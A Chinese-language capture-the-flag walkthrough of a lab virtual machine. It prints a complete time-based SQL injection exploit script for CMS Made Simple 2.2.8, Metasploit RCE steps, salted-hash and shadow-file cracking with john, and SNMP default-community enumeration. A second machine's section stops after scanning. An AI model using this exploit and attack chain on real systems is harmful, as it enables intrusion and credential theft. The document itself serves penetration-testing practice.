#  靶机1

## nmap

### 扫描

```bash
nmap -sCV 192.168.70.1/24
```



```bash
# nmap -sCV 192.168.70.1/24
Starting Nmap 7.92 ( https://nmap.org ) at 2024-12-09 09:01 �й���׼ʱ��
Nmap scan report for 192.168.70.44 (192.168.70.44)
Host is up (0.00074s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 11:06:7e:69:3a:9d:39:f0:2c:63:a5:9e:47:33:74:e3 (RSA)
|   256 ea:2c:a2:44:b9:26:ab:b5:27:0d:d5:e4:2b:24:b4:8f (ECDSA)
|_  256 99:84:38:df:29:a0:c8:8d:12:03:d4:3f:6f:d4:bc:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: safe-web
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 00:0C:29:C6:CD:60 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> 192.168.70.44
>
> 80端口

http://192.168.70.44

### udp

nmap默认是不扫描udp端口的，我们需要用`-sU`参数对udp端口进行单独扫描。

```bash
nmap -sU 192.168.70.44
```



```bash
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
161/udp   open          snmp
30718/udp open|filtered unknown
53838/udp open|filtered unknown
MAC Address: 00:0C:29:C6:CD:60 (VMware)
```

> snmp

## 目录扫描

### dirsearch

```bash
dirsearch -u http://192.168.70.44 
```

```bash
[09:26:05] 301 -  315B  - /images  ->  http://192.168.70.44/images/         
[09:26:05] 200 -  637B  - /images/
[09:26:16] 403 -  278B  - /server-status                                    
[09:26:16] 403 -  278B  - /server-status/                                   
[09:26:18] 301 -  314B  - /style  ->  http://192.168.70.44/style/
```

http://192.168.70.44/images/

http://192.168.70.44/style/

### 拼接网站路径

#### vedas.zlp

http://192.168.70.44/vedas.zip

#### Kashyapa

```bash
http://192.168.70.44/#kashyapa/
```

http://192.168.70.44/Kashyapa/

## 1.CMS Made Simple 

http://192.168.70.44/Kashyapa

> CMS Made Simple version 2.2.8

Made Simple CMS 版本2.2.8

http://192.168.70.44/Kashyapa/admin/login.php

### 1.msf

#### cms made simple

Made Simple CMS 版本2.2.8

https://blog.csdn.net/qq_34942239/article/details/137010764

#### 搜Made Simple CMS漏洞

```bash
msfconsole

searchsploit cms made simple
```

> CMS Made Simple < 2.2.10 - SQL Injection                            | php/webapps/46635.py

```bash
cd /root
searchsploit -m 46635.py

python /root/46635.py -u http://192.168.70.44/Kashyapa --crack -w user.txt
```

##### 安装termcolor

如果缺少termcolor模块，在官网下载并kali中安装termcolor。

下载地址：https://github.com/termcolor/termcolor/releases

```bash
git clone https://github.com/termcolor/termcolor
cd termcolor

wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2 get-pip.py
pip2 install .
pip2 install termcolor
```

##### 结果

```bash
[+] Salt for password found: 65bd8602d290b16d

[+] Username found: atri

[+] Email found: abcd@gmail.com
[+] Password found: 49ba135760e8265758ae48ef5c7338c7
```



#### 爆破加盐的hash

> atri:49ba135760e8265758ae48ef5c7338c7$65bd8602d290b16d
>
> 用户名:密文$加盐

```bash
john 3.txt --wordlist=/usr/share/wordlists/rockyou.txt -rules=best64 -format=dynamic_4
```



```bash
┌──(root㉿kali)-[~/palu]
└─# john 3.txt --wordlist=/usr/share/wordlists/rockyou.txt -rules=best64 -format=dynamic_4
Using default input encoding: UTF-8
Loaded 1 password hash (dynamic_4 [md5($s.$p) (OSC) 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
anasuya          (atri)     
1g 0:00:00:01 DONE (2024-12-09 15:38) 0.6666g/s 685440p/s 685440c/s 685440C/s anyla06..anakbapak
Use the "--show --format=dynamic_4" options to display all of the cracked passwords reliably
Session completed.
```

> atri / anasuya    

登录后台

http://192.168.70.44/Kashyapa/admin/login.php

> atri / anasuya

#### msf搜exp

```bash
msfconsole
search made simple 2.2.8
use exploit/multi/http/cmsms_object_injection_rce
set USERNAME atri
set PASSWORD anasuya
set RHOST 192.168.70.44
set TARGETURI Kashyapa
run
```



```bash
meterpreter > getuid                                                                                                         
Server username: www-data
shell

netstat -nlp
grep -irE "flag" /opt
```

> second flag:{nl1QG}

#### snmp

```bash
search snmp
use auxiliary/scanner/snmp/snmp_enum
set rhost 192.168.70.44
run
```



```bash
[*] System information:

Host IP                       : 192.168.70.44
Hostname                      : ubuntu
Description                   : Linux ubuntu 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
Contact                       : congratulation,third flag:(xmcw==)
Location                      : user:{vedas}
Uptime snmp                   : 02:03:40.52
Uptime system                 : 02:03:33.27
System date                   : 2024-12-9 16:39:02.0

```

> congratulation,third flag:(xmcw==)

### 2.CMS Made Simple

CMS Made Simple < 2.2.10 - SQL Injection

https://www.modb.pro/db/186809

https://www.exploit-db.com/exploits/46635

#### 时间盲注

```bash
cewl 192.168.70.44 -w user.txt
```



```bash
python3 CVE-2019-9053.py -u http://192.168.70.44/Kashyapa --crack -w user.txt
```

##### 结果

```bash
[+] Salt for password found: 65bd8602d290b16d
[+] Username found: atri
[+] Email found: abcd@gmail.com
[+] Password found: 49ba135760e8265758ae48ef5c7338c7
```

##### exp.py

```bash
import requests
from termcolor import colored
import time
from termcolor import cprint
import optparse
import hashlib

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_option('-w', '--wordlist', action="store", dest="wordlist", help="Wordlist for crack admin password")
parser.add_option('-c', '--crack', action="store_true", dest="cracking", help="Crack password with wordlist", default=False)

options, args = parser.parse_args()
if not options.url:
    print("[+] Specify an url target")
    print("[+] Example usage (no cracking password): exploit.py -u http://target-uri")
    print("[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist")
    print("[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.")
    exit()

url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
flag = True
password = ""
temp_password = ""
TIME = 1
db_name = ""
output = ""
email = ""

salt = ''
wordlist = ""
if options.wordlist:
    wordlist += options.wordlist

def crack_password():
    global password
    global output
    global wordlist
    global salt
    dict = open(wordlist)
    for line in dict.readlines():
        line = line.replace("\n", "")
        beautify_print_try(line)
        if(hashlib.md5(str(salt) + line).hexdigest() == password):
            output += "\n[+] Password cracked: " + line
            break
    dict.close()

def beautify_print_try(value):
    global output
    print("\033c")
    cprint(output,'green', attrs=['bold'])
    cprint('[*] Try: ' + value, 'red', attrs=['bold'])

def beautify_print():
    global output
    print("\033c")
    cprint(output,'green', attrs=['bold'])

def dump_salt():
    global flag
    global salt
    global output
    ord_salt = ""
    ord_salt_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_salt = salt + dictionary[i]
            ord_salt_temp = ord_salt + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_salt)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            salt = temp_salt
            ord_salt = ord_salt_temp
    flag = True
    output += '\n[+] Salt for password found: ' + salt

def dump_password():
    global flag
    global password
    global output
    ord_password = ""
    ord_password_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_password = password + dictionary[i]
            ord_password_temp = ord_password + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_password)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users"
            payload += "+where+password+like+0x" + ord_password_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            password = temp_password
            ord_password = ord_password_temp
    flag = True
    output += '\n[+] Password found: ' + password

def dump_username():
    global flag
    global db_name
    global output
    ord_db_name = ""
    ord_db_name_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_db_name = db_name + dictionary[i]
            ord_db_name_temp = ord_db_name + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_db_name)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+username+like+0x" + ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            db_name = temp_db_name
            ord_db_name = ord_db_name_temp
    output += '\n[+] Username found: ' + db_name
    flag = True

def dump_email():
    global flag
    global email
    global output
    ord_email = ""
    ord_email_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_email = email + dictionary[i]
            ord_email_temp = ord_email + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_email)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+email+like+0x" + ord_email_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            email = temp_email
            ord_email = ord_email_temp
    output += '\n[+] Email found: ' + email
    flag = True

dump_salt()
dump_username()
dump_email()
dump_password()

if options.cracking:
    print(colored("[*] Now try to crack password"))
    crack_password()

beautify_print()

```

#### cewl生成字典

> He was married to anasuya
>
> 他与阿奴苏亚结婚

https://digi.ninja/

提取网页关键字生成字典

```bash
cewl 192.168.70.44
cewl 192.168.70.44 -w user.txt
```



```bash
└─# cewl 192.168.70.44
CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
the
and
are
Vedas
with
texts
WEB
KASHYAPA
Image
The
Hinduism
they
were
Sanskrit
ancient
ABOUT
Parallax
Text
They
other
have
some
what
vedas
Samaveda
sukta
Navbar
top
small
screens
religious
which
meaning
Eternal
knowledge
that
thought
oldest
not
works
existed
sages
BCE
for
Vedic
preserved
them
was
heard
Shruti
Bhagavad
Gita
VERSES
VEDAS
Container
Section
images
Modal
Kashyapa
Rigveda
Hacking
Articles
Vivaha
Tamil
safe
web
sit
HOME
SEARCH
First
Logo
SAFE
inform
religion
also
known
Sanatan
Dharma
Order
Path
term
veda
means
contain
fundamental
relating
underlying
cause
function
personal
response
existence
considered
among
world
commonly
referred
scripture
accurate
can
defined
holy
writ
concerning
nature
Divine
Unlike
scriptures
religions
however
been
revealed
certain
person
persons
specific
historical
moment
believed
always
apprehended
deep
meditative
states
point
prior
but
precisely
when
unknown
oral
form
passed
down
from
master
student
generations
until
committed
writing
between
called
Period
India
carefully
orally
masters
would
students
memorize
forwards
backwards
emphasis
exact
pronunciation
order
keep
originally
intact
therefore
regarded
contrasted
designated
Smritis
remembered
accounts
great
heroes
their
struggles
such
Mahabharata
Ramayana
although
sects
regard
MANTRAS
ORIGIN
SAMA
Second
Here
pre
historic
Click
make
bigger
Responsive
Grid
Four
columns
tablets
laptops
desktops
Will
stack
mobile
devices
width
full
size
click
Third
kashyapa
WHO
WAS
revered
sage
one
Saptarishis
seven
well
numerous
Indian
mythologies
most
Rishi
listed
colophon
verse
Brihadaranyaka
Upanishad
married
anasuya
common
name
referring
many
different
personalities
Hindu
Buddhist
Footer
Powered
Yajurveda
Atharvaveda
Devi
Toggle
Navigation
Menu
Close
```

#### burpsuite暴力破解

```bash
POST /Kashyapa/admin/login.php HTTP/1.1
Host: 192.168.70.44
Content-Length: 49
Cache-Control: max-age=0
Origin: http://192.168.70.44
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.70.44/Kashyapa/admin/login.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: CMSSESSIDcb079ad4d4cb=vt818m8g6kuvfvi9633r7smt8s
Connection: keep-alive

username=atri&password=anasuya&loginsubmit=Submit
```

> atri / anasuya

#### 后台登录

http://192.168.70.44/Kashyapa/admin/login.php

> atri / anasuya

##### 搜索flag

http://192.168.70.44/Kashyapa

![image-20241209141335790](https://image.201068.xyz/assets/16.高级渗透测试实操(寻找立足点)/image-20241209141335790.png)

![image-20241209142002159](https://image.201068.xyz/assets/16.高级渗透测试实操(寻找立足点)/image-20241209142002159.png)

##### default-extensions

http://192.168.70.44/Kashyapa/index.php?page=default-extensions

![image-20241209141304101](https://image.201068.xyz/assets/16.高级渗透测试实操(寻找立足点)/image-20241209141304101.png)

### first flag

/var/www/html/Kashyapa/lib/smarty/sysplugins/smarty_internal_templatecompilerbase.php

> congratulation，first flag: {THVhb}

![image-20241209142253351](https://image.201068.xyz/assets/16.高级渗透测试实操(寻找立足点)/image-20241209142253351.png)

![image-20241209142944439](https://image.201068.xyz/assets/16.高级渗透测试实操(寻找立足点)/image-20241209142944439.png)

## 2.SSH--atri

```bash
ssh atri@192.168.70.44
anasuya

grep -irE "flag" /opt
```

### second flag

```bash
atri@ubuntu:~$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .cache  .gnupg  .profile
atri@ubuntu:~$ cat .bash_history

sudo su
cd /home
ls
exit
atri@ubuntu:~$ cd ..
atri@ubuntu:/home$ ls
atri  vedas
atri@ubuntu:/home$ cd vedas/
atri@ubuntu:/home/vedas$ ls
atri@ubuntu:/home/vedas$ ls =a
ls: cannot access '=a': No such file or directory
atri@ubuntu:/home/vedas$ ls -a
.   .bash_history  .bashrc  .gnupg          .profile                   .wget-hsts
..  .bash_logout   .cache   .mysql_history  .sudo_as_admin_successful
atri@ubuntu:/home/vedas$ grep -irE "flag" /opt
/opt/test/index.html:congratulation,second flag:{nl1QG}
```

/opt/test/index.html

> congratulation,second flag:{nl1QG}



```bash
cd /home/vedas/
ls
```



## 3.SNMP服务

https://www.freebuf.com/articles/network/319234.html

### SNMP服务介绍

**把MIB当成一个k.v数据库，我们输入key(OID)就能获取到对应的value**。

snmpwalk、snmpget、snmpset这三款工具进行测试。

snmpwalk和snmpget都可以用来获取值，

其主要区别是snmpwalk是对OID值的遍历，而snmpget是取具体的OID的值。

### 默认密码获取信息

snmpwalk

```bash
snmpwalk -c public -v2c 192.168.70.44
```



```bash
┌──(root㉿kali)-[~]
└─# snmpwalk -c public -v2c 192.168.70.44
Created directory: /var/lib/snmp/cert_indexes
iso.3.6.1.2.1.1.1.0 = STRING: "Linux ubuntu 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (348117) 0:58:01.17
iso.3.6.1.2.1.1.4.0 = STRING: "congratulation,third flag:(xmcw==)"
iso.3.6.1.2.1.1.5.0 = STRING: "ubuntu"
iso.3.6.1.2.1.1.6.0 = STRING: "user:{vedas}"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (47) 0:00:00.47
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (44) 0:00:00.44
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (44) 0:00:00.44
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (44) 0:00:00.44
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (45) 0:00:00.45
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (45) 0:00:00.45
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (45) 0:00:00.45
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (46) 0:00:00.46
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (46) 0:00:00.46
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (47) 0:00:00.47
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (47) 0:00:00.47
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (348847) 0:58:08.47
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E8 0C 08 11 38 0F 00 2D 08 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/boot/vmlinuz-4.15.0-20-generic root=UUID=a2ee322d-97ce-4ef1-8ae1-3a063ece28c7 ro find_preseed=/preseed.cfg noprompt "
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 151
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

> congratulation,third flag:(xmcw==)

### third flag

> congratulation,third flag:(xmcw==)



### base64解码

按3个flag的顺序合并成base64编码

```bash
THVhbnl1QGxmcw==
```

> Luanyu@lfs

## 4.SSH--vedas

### sudo权限

```bash
ssh vedas@192.168.70.44
Luanyu@lfs

id
sudo ls /root
sudo cat /root/final.txt

sudo su root
cat /root/final.txt
```



```bash
cat .bash_history
sudo cat .mysql_history
mysql -u cmsmsuser -p123
show databases;
use cmsmsdb;
show tables;
select * from cms_users;

whereis apache2
netstat -nlp
```

> GRANT ALL ON cmsmsdb.* TO 'cmsmsuser'@'localhost' IDENTIFIED BY '123' WITH GRANT OPTION;
>
> final flag:{c08cddc7f3bac6f00c00408c6d2274dc}

### final flag

```bash
vedas@ubuntu:~$ ls -a
.   .bash_history  .bashrc  .gnupg          .profile                   .wget-hsts
..  .bash_logout   .cache   .mysql_history  .sudo_as_admin_successful
vedas@ubuntu:~$ cat .bash_history

ls -al
echo "" > .bash_history
exit
ifconfig
sudo su
exit
sudo su
cd /etc/apache2/
ls
cd sites-enabled/
ls
cat raj.conf
cd /opt/test/
ls
cat index.html
vi index.html
sudo su
cd /home
ls
sudo -u atri
exit
sudo su
ifoccnfig
ifconfig
sudo su
exit
vedas@ubuntu:~$ id
uid=1000(vedas) gid=1000(vedas) groups=1000(vedas),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
vedas@ubuntu:~$ sudo cat .mysql_history
CREATE DATABASE cmsmsdb;
CREATE USER 'cmsmsuser'@'localhost' IDENTIFIED BY '123';
GRANT ALL ON cmsmsdb.* TO 'cmsmsuser'@'localhost' IDENTIFIED BY '123' WITH GRANT OPTION;
FLUSH PRIVILEGES;
exit;
vedas@ubuntu:~$ netstat -nlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
udp     3072      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 192.168.70.44:68        0.0.0.0:*                           -
udp        0      0 0.0.0.0:161             0.0.0.0:*                           -
udp        0      0 0.0.0.0:46341           0.0.0.0:*                           -
raw6       0      0 :::58                   :::*                    7           -
vedas@ubuntu:~$ sudo ls /root
final.txt
vedas@ubuntu:~$ sudo cat /root/final.txt

 final flag:{c08cddc7f3bac6f00c00408c6d2274dc}

!! Congrats you have finished this task !!


+-+-+-+-+-+ +-+-+-+-+-+-+-+
 |E|n|j|o|y| |l|u|a|n|y|u|
 +-+-+-+-+-+ +-+-+-+-+-+-+-+
__________________________________
```

> final flag:{c08cddc7f3bac6f00c00408c6d2274dc}



## DiskGenius

### shadow

> /etc/shadow

```bash
vedas:$6$rD5etybc$shvblvk1/YtqzZiAwejv47TTnA7poEkSUYFfN2anPIXNMIEx80qbFudVYj69WmuJrXfvRtN0DBtRykNxWpY9U1
atri:$6$EYm2/9zC$hNrIxGjErnzRvBaDHuLW0L/kIo7975e4RUTJGus/HaXrbvZQQGRd8hVXB2sMVyiB9XtrzKZn1JgTDhnw04dS/0
```



```bash
john 4.txt -w=/usr/share/wordlists/rockyou.txt
```

> anasuya          (atri) 

### .bash_history

> /root/.bash_history

```bash
passwd vedas
exit
cd /tmp/
ls
cd /home
ls
exit
vi index.html 
cat /etc/apache2/sites-enabled/raj.conf 
exit
cd /opt/
cd test
vi index.html 
clear
vi index.html 
clear
exit
cd /etc/snmp/
ls
cat snmp.conf 
cat snmpd.conf 
ls -a
vi snmp.conf 
vi snmpd.conf 
ls
cat mib2c.column_enums.conf 
vi mib2c.column_enums.conf 
cd /var/log/
ls
cd /etc/snmp/
ls
vi snmpd.conf 
service snmpd.conf restart
systemctl restart snmpd
cd /opt/test/index.html 
cat /opt/test/index.html 
cd /root/
ls
cat final.txt 
vi final.txt 
cd /etc/apache2/sites-enabled/
vi 000-default.conf 
cd /var/www/html/
ls
vi index.html 
exit

```



```bash
/etc/apache2/sites-enabled/raj.conf
/opt/test/index.html
/etc/snmp/snmp.conf
/etc/snmp/snmpd.conf
/etc/snmp/mib2c.column_enums.conf

/root/final.txt
/etc/apache2/sites-enabled/000-default.conf 
/var/www/html/index.html
```

### raj.conf

> /etc/apache2/sites-available/raj.conf

```bash
<VirtualHost 127.0.0.1:5000>
  DocumentRoot /opt/test/
  ServerName  localhost

  AllowEncodedSlashes NoDecode
  <Directory "/opt/test/">
    Require all granted
    AllowOverride All
    Options FollowSymLinks MultiViews
  </Directory>
</VirtualHost>
```

### smarty_internal_templatecompilerbase.php

> /var/www/html/Kashyapa/lib/smarty/sysplugins/smarty_internal_templatecompilerbase.php

```bash
congratulation，first flag: {THVhb}
```

### index.html	second flag

> /opt/test/index.html

```bash
congratulation,second flag:{nl1QG}
```

### snmpd.conf	third flag

> /etc/snmp/snmpd.conf

```bash
sysLocation     user:{vedas}
sysContact      congratulation,third flag:(xmcw==)
```

### base64

```bash
THVhbnl1QGxmcw==
```

> Luanyu@lfs

```bash
ssh vedas@192.168.70.44
Luanyu@lfs
```



### final.txt	final flag

> /root/final.txt

```bash
final flag:{c08cddc7f3bac6f00c00408c6d2274dc}
```

### config.php

> /var/www/html/Kashyapa/config.php

```bash
<?php
# CMS Made Simple Configuration File
# Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference
#
$config['dbms'] = 'mysqli';
$config['db_hostname'] = 'localhost';
$config['db_username'] = 'cmsmsuser';
$config['db_password'] = '123';
$config['db_name'] = 'cmsmsdb';
$config['db_prefix'] = 'cms_';
$config['timezone'] = 'America/Los_Angeles';
?>
```

### .mysql_history

> /home/vedas/.mysql_history

```bash
CREATE DATABASE cmsmsdb;
CREATE USER 'cmsmsuser'@'localhost' IDENTIFIED BY '123';
GRANT ALL ON cmsmsdb.* TO 'cmsmsuser'@'localhost' IDENTIFIED BY '123' WITH GRANT OPTION;
FLUSH PRIVILEGES;
exit;
```

## 工具总结

### cewl生成字典

```bash
cewl 192.168.70.44 -w user.txt
```

### SNMP服务攻击

**把MIB当成一个k.v数据库，我们输入key(OID)就能获取到对应的value**。

snmpwalk、snmpget、snmpset这三款工具进行测试。

snmpwalk和snmpget都可以用来获取值，

其主要区别是snmpwalk是对OID值的遍历，而snmpget是取具体的OID的值。

#### snmpwalk获取信息

默认密码

```bash
snmpwalk -c public -v2c 192.168.70.44
```

#### msf攻击snmp服务

```bash
search snmp
use auxiliary/scanner/snmp/snmp_enum
set rhost 192.168.70.44
run
```

### CMS Made Simple < 2.2.10 - SQL Injection

https://www.modb.pro/db/186809

https://www.exploit-db.com/exploits/46635

#### msf搜Made Simple CMS漏洞

```bash
msfconsole

searchsploit cms made simple
```

> CMS Made Simple < 2.2.10 - SQL Injection                            | php/webapps/46635.py

```bash
cd /root
searchsploit -m 46635.py

python /root/46635.py -u http://192.168.70.44/Kashyapa --crack -w user.txt
```

#### msf搜exp

```bash
msfconsole
search made simple 2.2.8
use exploit/multi/http/cmsms_object_injection_rce
set USERNAME atri
set PASSWORD anasuya
set RHOST 192.168.70.44
set TARGETURI Kashyapa
run
```

### john爆破加盐的hash

> atri:49ba135760e8265758ae48ef5c7338c7$65bd8602d290b16d
>
> 用户名:密文$加盐

```bash
john 3.txt --wordlist=/usr/share/wordlists/rockyou.txt -rules=best64 -format=dynamic_4
```



# 靶机2

## 1.nmap

```bash
nmap -sCV 192.168.70.0/24
```



```bash
Nmap scan report for 192.168.70.45
Host is up (0.0011s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 ec:61:97:9f:4d:cb:75:99:59:d4:c1:c4:d4:3e:d9:dc (DSA)
|   2048 89:99:c4:54:9a:18:66:f7:cd:8e:ab:b6:aa:31:2e:c6 (RSA)
|   256 60:be:dd:8f:1a:d7:a3:f3:fe:21:cc:2f:11:30:7b:0d (ECDSA)
|_  256 39:d9:79:26:60:3d:6c:a2:1e:8b:19:71:c0:e2:5e:5f (ED25519)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Clean Blog - Start Bootstrap Theme
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          36907/tcp   status
|   100024  1          41489/tcp6  status
|   100024  1          53381/udp   status
|_  100024  1          60345/udp6  status
MAC Address: 00:0C:29:76:48:7A (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> 192.168.70.45
>
> 22,80,111

```bash
nmap -sU 192.168.70.45
```



```bash
Nmap scan report for 192.168.70.45
Host is up (0.00084s latency).
Not shown: 955 closed udp ports (port-unreach), 44 open|filtered udp ports (no-response)
PORT    STATE SERVICE
111/udp open  rpcbind
MAC Address: 00:0C:29:76:48:7A (VMware)
```



## 2.目录扫描

http://192.168.70.45

### dirsearch

```bash
dirsearch -u http://192.168.70.45
```



```bash
[09:11:40] 301 -  311B  - /js  ->  http://192.168.70.45/js/
[09:11:45] 200 -    1KB - /about.html                                       
[09:11:46] 301 -  314B  - /admin  ->  http://192.168.70.45/admin/           
[09:11:47] 200 -  455B  - /admin/                                           
[09:11:56] 200 -    2KB - /contact.html                                     
[09:11:57] 301 -  312B  - /css  ->  http://192.168.70.45/css/               
[09:12:01] 200 -  947B  - /gulpfile.js                                      
[09:12:03] 301 -  312B  - /img  ->  http://192.168.70.45/img/               
[09:12:04] 200 -  548B  - /js/                                              
[09:12:05] 200 -    1KB - /LICENSE                                          
[09:12:06] 301 -  313B  - /mail  ->  http://192.168.70.45/mail/             
[09:12:06] 200 -  460B  - /mail/                                            
